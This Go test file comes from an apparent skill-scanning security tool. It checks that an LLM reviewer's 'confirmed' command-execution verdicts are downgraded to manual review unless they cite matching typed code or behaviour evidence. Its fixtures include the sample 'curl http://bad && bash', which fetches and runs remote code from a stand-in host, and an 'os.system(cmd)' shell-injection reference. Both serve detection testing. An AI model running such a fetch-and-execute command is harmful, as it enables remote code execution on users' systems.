package handler

import (
	"strings"
	"testing"

	"skill-scanner/internal/review"
)

func TestLLMLoopVerdictDowngradesConfirmedWithoutTypedEvidenceMatch(t *testing.T) {
	stage := review.LLMStageContext{Purpose: review.LLMStageSecondReview, StageID: "SF-CONTEXT-ONLY", Finding: review.NormalizedFinding{ID: "SF-CONTEXT-ONLY", Category: "命令执行", Severity: "高风险", Confidence: "高", ContextEvidenceRefs: []string{"README.md:12 示例说明"}, EvidenceRefs: []string{"README.md:12 示例说明"}}}
	verdict := llmLoopResultToReviewVerdict(review.ReviewAgentTask{FindingID: "SF-CONTEXT-ONLY", StageContext: &stage, StrictStandards: []string{"证据完整性"}}, review.LLMAnalysisLoopResult{FinalResponse: `{"verdict":"confirmed","reason":"文档中描述了命令执行","risks":[{"severity":"high","status":"confirmed","description":"文档描述支持命令执行","key_code_location":"README.md:12","evidence_refs":["README.md:12 示例说明"],"remediation":"删除危险说明。","verification_step":"重新扫描 README.md。","remediation_quality":"high"}]}`})
	if verdict.Verdict != "needs_manual_review" || verdict.Confidence != "低" {
		t.Fatalf("expected confirmed without typed evidence to downgrade, got %+v", verdict)
	}
	if !containsString(verdict.MissingEvidence, "二审上下文缺少可用于 confirmed 的代码或行为证据") {
		t.Fatalf("expected typed evidence gate missing evidence, got %+v", verdict.MissingEvidence)
	}
	if !strings.Contains(verdict.Reason, "硬校验") {
		t.Fatalf("expected downgrade reason mentions hard validation, got %+v", verdict)
	}
}

func TestLLMLoopVerdictDowngradesConfirmedWhenLocationAndEvidenceMissTypedSet(t *testing.T) {
	stage := review.LLMStageContext{Purpose: review.LLMStageSecondReview, StageID: "SF-MISMATCHED", Finding: review.NormalizedFinding{ID: "SF-MISMATCHED", Category: "命令执行", Severity: "高风险", Confidence: "高", CodeEvidenceRefs: []string{"scripts/run.py:10 os.system(cmd)"}, BehaviorEvidenceRefs: []string{"关键样本: curl http://bad && bash"}, EvidenceRefs: []string{"scripts/run.py:10 os.system(cmd)", "关键样本: curl http://bad && bash"}}}
	verdict := llmLoopResultToReviewVerdict(review.ReviewAgentTask{FindingID: "SF-MISMATCHED", StageContext: &stage, StrictStandards: []string{"证据完整性"}}, review.LLMAnalysisLoopResult{FinalResponse: `{"verdict":"confirmed","reason":"存在命令执行证据","risks":[{"severity":"high","status":"confirmed","description":"命令拼接进入 shell","key_code_location":"README.md:12","evidence_refs":["README.md:12 示例说明"],"remediation":"删除危险说明。","verification_step":"重新扫描 README.md。","remediation_quality":"high"}]}`})
	if verdict.Verdict != "needs_manual_review" {
		t.Fatalf("expected mismatched typed evidence to downgrade, got %+v", verdict)
	}
	for _, want := range []string{"LLM reviewer confirmed 使用的 evidence_refs 未命中允许的代码、行为或闭环别名证据集合", "LLM reviewer confirmed 的 key_code_location 未绑定允许的代码、行为或闭环别名定位"} {
		if !containsString(verdict.MissingEvidence, want) {
			t.Fatalf("expected missing evidence contains %q, got %+v", want, verdict.MissingEvidence)
		}
	}
}

func TestLLMLoopVerdictKeepsConfirmedWhenTypedEvidenceMatches(t *testing.T) {
	stage := review.LLMStageContext{Purpose: review.LLMStageSecondReview, StageID: "SF-MATCHED", Finding: review.NormalizedFinding{ID: "SF-MATCHED", Category: "命令执行", Severity: "高风险", Confidence: "高", CodeEvidenceRefs: []string{"scripts/run.py:10 os.system(cmd)"}, BehaviorEvidenceRefs: []string{"关键样本: curl http://bad && bash"}, EvidenceRefs: []string{"scripts/run.py:10 os.system(cmd)", "关键样本: curl http://bad && bash"}}}
	verdict := llmLoopResultToReviewVerdict(review.ReviewAgentTask{FindingID: "SF-MATCHED", StageContext: &stage, StrictStandards: []string{"证据完整性"}}, review.LLMAnalysisLoopResult{FinalResponse: `{"verdict":"confirmed","reason":"存在命令执行证据","risks":[{"severity":"high","status":"confirmed","description":"命令拼接进入 shell","key_code_location":"scripts/run.py:10","evidence_refs":["scripts/run.py:10 os.system(cmd)"],"remediation":"在 scripts/run.py:10 移除 shell 拼接。","verification_step":"重新扫描 scripts/run.py:10。","remediation_quality":"high"}]}`})
	if verdict.Verdict != "confirmed" {
		t.Fatalf("expected confirmed with typed evidence match, got %+v", verdict)
	}
}

func TestLLMLoopVerdictFallsBackFromNonJSONFalsePositiveText(t *testing.T) {
	verdict := llmLoopResultToReviewVerdict(review.ReviewAgentTask{FindingID: "SF-FALLBACK-FP", StrictStandards: []string{"证据完整性"}}, review.LLMAnalysisLoopResult{FinalResponse: "结论：倾向误报\n原因：该证据只出现在 README 示例中，不构成真实运行链路。"})
	if verdict.Verdict != "likely_false_positive" {
		t.Fatalf("expected fallback false positive verdict, got %+v", verdict)
	}
	if !strings.Contains(verdict.Reason, "README 示例") {
		t.Fatalf("expected fallback reason from text, got %+v", verdict)
	}
	if !containsString(verdict.MissingEvidence, "LLM reviewer bounded loop 未返回有效 JSON 裁决，已从文本输出提取有限结论。") {
		t.Fatalf("expected JSON fallback missing evidence, got %+v", verdict.MissingEvidence)
	}
}

func TestLLMLoopVerdictFallsBackConfirmedTextToManualReview(t *testing.T) {
	verdict := llmLoopResultToReviewVerdict(review.ReviewAgentTask{FindingID: "SF-FALLBACK-CONFIRMED", StrictStandards: []string{"证据完整性"}}, review.LLMAnalysisLoopResult{FinalResponse: "confirmed: 真实风险，存在命令执行。"})
	if verdict.Verdict != "needs_manual_review" {
		t.Fatalf("expected non-json confirmed fallback to manual review, got %+v", verdict)
	}
	if !containsString(verdict.MissingEvidence, "非 JSON confirmed 缺少可校验 risks、evidence_refs 和 key_code_location") {
		t.Fatalf("expected confirmed fallback evidence gate, got %+v", verdict.MissingEvidence)
	}
}
